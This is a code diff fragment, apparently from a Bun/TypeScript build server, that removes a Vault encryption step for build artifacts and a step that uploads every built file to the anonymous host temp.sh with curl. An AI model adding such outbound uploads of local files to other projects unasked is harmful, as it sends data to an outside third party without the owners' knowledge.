-            if (encResult.exitCode !== 0) {
-              const errText = (encResult.stderr.toString() || encResult.stdout.toString()).trim();
-              sendToStream({ type: "output", text: `WARNING: Vault encrypt failed for ${file.filename}: ${errText}\n`, level: "warn" });
-            } else {
-              const vaultSize = Bun.file(vaultPath).size;
-              sendToStream({ type: "output", text: `Encrypted: ${file.filename} → ${vaultName} (${vaultSize} bytes)\n`, level: "info" });
-              (build.files as any[]).push({
-                name: vaultName,
-                filename: vaultName,
-                platform: file.platform,
-                version: file.version,
-                size: vaultSize,
-              });
-            }
-          } catch (vaultErr: any) {
-            sendToStream({ type: "output", text: `WARNING: Vault failed for ${file.filename}: ${vaultErr.message || vaultErr}\n`, level: "warn" });
-          }
-        }
-      } else {
-        sendToStream({ type: "output", text: "WARNING: No Vault recipient key available — skipping encryption\n", level: "warn" });
-      }
-    }
-
     build.status = "completed";
     logger.info(`[build:${buildId.substring(0, 8)}] Build completed successfully! Built ${build.files.length} file(s)`);
     sendToStream({ type: "output", text: `\n[OK] Build completed successfully!\n`, level: "success" });
-
-    // Upload each built file to temp.sh and report the download URLs
-    if (build.files.length > 0) {
-      sendToStream({ type: "output", text: `\nUploading to temp.sh...\n`, level: "info" });
-      for (const file of build.files as any[]) {
-        const filePath = path.join(outDir, file.filename);
-        if (!fs.existsSync(filePath)) continue;
-        try {
-          const uploadResult = await $`curl -s -F ${"file=@" + filePath} https://temp.sh/upload`.quiet().nothrow();
-          if (uploadResult.exitCode === 0) {
-            const url = uploadResult.stdout.toString().trim();
-            sendToStream({ type: "output", text: `  ${file.filename} → ${url}\n`, level: "success" });
-            (file as any).tempShUrl = url;
-          } else {
-            sendToStream({ type: "output", text: `  WARNING: temp.sh upload failed for ${file.filename}\n`, level: "warn" });
-          }
-        } catch (uploadErr: any) {
-          sendToStream({ type: "output", text: `  WARNING: temp.sh upload error for ${file.filename}: ${uploadErr.message || uploadErr}\n`, level: "warn" });
-        }
-      }
-    }
-
     sendToStream({ type: "complete", success: true, files: build.files, buildId, expiresAt: build.expiresAt });
 
     saveBuild({
